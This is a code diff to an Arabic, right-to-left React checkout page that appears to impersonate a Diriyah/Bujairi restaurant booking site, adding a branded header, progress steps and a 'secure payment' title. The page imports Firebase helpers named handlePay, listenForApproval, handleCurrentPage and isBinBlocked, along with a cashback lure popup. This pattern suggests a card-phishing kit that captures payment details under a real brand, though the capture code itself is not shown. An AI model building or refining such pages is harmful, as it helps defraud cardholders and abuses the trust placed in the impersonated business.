@@ -1,23 +1,20 @@
 import { useLocation } from "wouter";
 import {
+  ArrowRight,
   ChevronDown,
   Wifi,
   X,
   CreditCard,
   Lock,
+  ShieldCheck,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import { Link } from "wouter";
 import { useState, useEffect } from "react";
 import { handlePay, handleCurrentPage, listenForApproval, isBinBlocked } from "@/lib/firebase";
 import cashbackImage from "@assets/adcs_1777058781807.jpg";
-import {
-  RestaurantNav,
-  ProgressBar,
-  PageBanner,
-  BujairiFooter,
-} from "@/components/bujairi-header";
 
 function CashbackPopup({ onClose }: { onClose: () => void }) {
   return (
@@ -69,18 +66,100 @@ export default function CheckoutPage() {
 
   return (
     <div
-      className="min-h-screen bg-[#ebddd0] flex flex-col"
+      className="min-h-screen bg-gradient-to-b from-[#f5efe6] to-[#ebddd0] flex flex-col"
       dir="rtl"
     >
       {showPopup && <CashbackPopup onClose={() => setShowPopup(false)} />}
-      <RestaurantNav active="booking-options" />
-      <ProgressBar current={3} />
-      <PageBanner title="الدفع" />
+      <Header />
+      <ProgressSteps />
+      <TitleSection />
       <main className="flex-1 px-4 py-6">
         <PaymentForm />
       </main>
       <PaymentFooter />
-      <BujairiFooter />
+    </div>
+  );
+}
+
+function Header() {
+  return (
+    <header className="bg-[#4a1525] text-white">
+      <div className="container mx-auto px-4 py-4">
+        <div className="flex items-center justify-between">
+          <Link href="/cart">
+            <Button
+              size="icon"
+              variant="ghost"
+              className="text-white hover:bg-white/10"
+              data-testid="button-menu-checkout"
+            >
+              <ArrowRight className="w-5 h-5" />
+            </Button>
+          </Link>
+
+          <div className="flex-1 flex justify-center">
+            <img
+              src="/logo-white.svg"
+              alt="الدرعية"
+              className="h-12"
+              data-testid="img-checkout-logo"
+            />
+          </div>
+
+          <div className="w-10" />
+        </div>
+      </div>
+    </header>
+  );
+}
+
+function ProgressSteps() {
+  return (
+    <div
+      className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] p-5"
+      data-testid="progress-steps-checkout"
+    >
+      <div className="flex items-center justify-center gap-1">
+        {[
+          { number: 1, label: "تسجيل" },
+          { number: 2, label: "الحجز" },
+          { number: 3, label: "السلة" },
+          { number: 4, label: "الدفع" },
+        ].map((step, index, arr) => (
+          <div key={step.number} className="flex items-center">
+            <div className="flex flex-col items-center">
+              <div className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gradient-to-br from-[#c9a96e] to-[#b8935a] text-white shadow-glow">
+                {step.number}
+              </div>
+              <span className="text-xs mt-2 text-primary font-medium">
+                {step.label}
+              </span>
+            </div>
+            {index < arr.length - 1 && (
+              <div className="w-10 h-1 mx-1 rounded-full bg-gradient-to-r from-[#c9a96e] to-[#b8935a]" />
+            )}
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+function TitleSection() {
+  return (
+    <div className="bg-gradient-to-r from-[#4a1525] to-[#3a0f1d] py-6 px-4 text-center">
+      <div className="flex items-center justify-center gap-3">
+        <CreditCard className="w-7 h-7 text-white" />
+        <h1
+          className="text-2xl font-bold text-white"
+          data-testid="text-checkout-title"
+        >
+          إتمام الشراء
+        </h1>
+      </div>
+      <p className="text-white/80 text-sm mt-2">
+        أدخل بيانات البطاقة للدفع الآمن
+      </p>
     </div>
   );
 }
